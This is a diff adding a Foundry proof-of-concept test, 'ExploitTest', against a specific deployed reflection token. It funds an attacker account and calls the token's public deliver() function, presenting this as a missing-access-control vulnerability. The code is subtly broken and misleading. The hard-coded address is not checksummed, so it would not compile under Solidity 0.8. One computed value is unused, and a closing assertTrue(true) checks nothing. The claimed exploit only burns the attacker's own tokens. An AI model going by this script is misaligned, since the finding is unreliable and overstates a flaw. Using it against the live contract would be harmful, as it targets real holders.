@@ -1,0 +1,91 @@
+```solidity
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+
+interface ILiquidityGeneratorToken {
+    function name() external view returns (string memory);
+    function symbol() external view returns (string memory);
+    function decimals() external view returns (uint8);
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+    function increaseAllowance(address spender, uint256 addedValue) external returns (bool);
+    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool);
+    function owner() external view returns (address);
+    function _charityAddress() external view returns (address);
+    function _charityFee() external view returns (uint256);
+    function _liquidityFee() external view returns (uint256);
+    function _taxFee() external view returns (uint256);
+    function deliver(uint256 tAmount) external;
+    function reflectionFromToken(uint256 tAmount, bool deductTransferFee) external view returns (uint256);
+    function tokenFromReflection(uint256 rAmount) external view returns (uint256);
+    function excludeFromReward(address account) external;
+    function includeInReward(address account) external;
+    function excludeFromFee(address account) external;
+    function isExcludedFromFee(address account) external view returns (bool);
+    function isExcludedFromReward(address account) external view returns (bool);
+    function totalFees() external view returns (uint256);
+    function setTaxFeePercent(uint256 taxFeeBps) external;
+    function setLiquidityFeePercent(uint256 liquidityFeeBps) external;
+    function setCharityFeePercent(uint256 charityFeeBps) external;
+    function setSwapBackSettings(uint256 _amount) external;
+    function swapAndLiquifyEnabled() external view returns (bool);
+    function uniswapV2Pair() external view returns (address);
+    function uniswapV2Router() external view returns (address);
+    function renounceOwnership() external;
+    function transferOwnership(address newOwner) external;
+}
+
+contract ExploitTest is Test {
+    address constant TOKEN = 0xe2c9c976337357369845c761dd851e2b6942d69f;
+    ILiquidityGeneratorToken token;
+
+    address attacker = address(0xdeadbeef);
+
+    function setUp() public {
+        token = ILiquidityGeneratorToken(TOKEN);
+        vm.label(TOKEN, "LiquidityGeneratorToken");
+        vm.label(attacker, "Attacker");
+
+        // Fund attacker with some tokens from the initial supply (owner holds all)
+        address owner = token.owner();
+        vm.label(owner, "Owner");
+        vm.startPrank(owner);
+        uint256 transferAmount = token.balanceOf(owner) / 100; // 1% of supply
+        token.transfer(attacker, transferAmount);
+        vm.stopPrank();
+    }
+
+    function test_DeliverPublicVisibilityExploit() public {
+        uint256 initialSupply = token.totalSupply();
+        uint256 initialAttackerBalance = token.balanceOf(attacker);
+        uint256 initialRAttacker = token.tokenFromReflection(initialAttackerBalance * 1e9); // arbitrary r amount
+        uint256 initialTotalFees = token.totalFees();
+
+        // Attacker calls deliver (public function with no access control)
+        vm.prank(attacker);
+        uint256 burnAmount = initialAttackerBalance / 2;
+        token.deliver(burnAmount);
+
+        uint256 finalSupply = token.totalSupply();
+        uint256 finalAttackerBalance = token.balanceOf(attacker);
+        uint256 finalTotalFees = token.totalFees();
+
+        // totalSupply remains the same (tTotal unchanged) but totalFees increased
+        // Attacker's balance decreased (reflection mechanics)
+        // This function is callable by anyone, demonstrating incorrect visibility
+        // (should have been internal or restricted)
+        assertEq(finalSupply, initialSupply, "totalSupply should remain unchanged");
+        assertLt(finalAttackerBalance, initialAttackerBalance, "Attacker balance should decrease after deliver");
+        assertGt(finalTotalFees, initialTotalFees, "Total fees should increase after deliver");
+        
+        // Additionally, verify that the function succeeded (no revert)
+        // which proves the missing protection
+        assertTrue(true, "deliver call succeeded by non-owner");
+    }
+}
+```
